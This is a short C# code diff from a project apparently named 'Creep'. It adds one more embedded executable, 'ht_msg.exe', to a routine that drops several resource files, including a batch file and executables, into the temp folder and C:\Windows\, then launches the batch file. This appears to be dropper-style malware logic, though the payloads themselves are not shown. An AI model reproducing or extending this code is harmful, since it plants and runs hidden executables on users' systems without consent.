@@ -78,6 +78,7 @@ namespace Creep
             System.IO.File.WriteAllBytes(temp + "windl.bat", Properties.Resources.windl);
             System.IO.File.WriteAllBytes(temp + "one.rtf", Properties.Resources.one);
             System.IO.File.WriteAllBytes(temp + "ht.exe", Properties.Resources.subox);
+            System.IO.File.WriteAllBytes(temp + "ht_msg.exe", Properties.Resources.ht_msg);
             System.IO.File.WriteAllBytes(@"C:\Windows\" + "ht.jpg", Properties.Resources.ht);
 
             ProcessStartInfo psi = new ProcessStartInfo(temp + "windl.bat");
